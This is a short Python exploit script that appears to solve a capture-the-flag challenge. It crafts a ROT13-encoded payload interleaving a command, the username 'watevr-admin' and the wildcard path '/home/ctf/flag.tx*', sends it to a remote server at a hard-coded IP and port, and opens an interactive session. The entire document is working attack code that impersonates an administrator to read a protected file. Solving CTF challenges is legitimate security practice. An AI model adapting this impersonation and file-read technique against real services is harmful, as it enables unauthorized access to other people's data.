from ptrlib import *

def rot13(s):
    output = b''
    for c in s:
        if ord('a') <= c <= ord('z'):
            output += bytes([ord('a') + (c - ord('a') + 13) % 26])
        elif ord('A') <= c <= ord('Z'):
            output += bytes([ord('A') + (c - ord('A') + 13) % 26])
        else:
            output += bytes([c])
    return output

def craft_payload(command, username, filepath):
    payload = b''
    for i in range(max(len(command), len(username), len(filepath))):
        if len(command) > i:
            payload += bytes([command[i]])
        else:
            payload += b'_'
        if len(username) > i:
            payload += bytes([username[i]])
        else:
            payload += b'_'
        if len(filepath) > i:
            payload += bytes([filepath[i]])
        else:
            payload += b'_'
    payload += b'\x00' * (0xc8 - len(payload))
    return rot13(payload)

sock = Socket("13.48.192.7", 50000)

payload = craft_payload(b'Fetch from file with index',
                        b'watevr-admin',
                        b'/home/ctf/flag.tx*')
sock.send(payload)

sock.interactive()
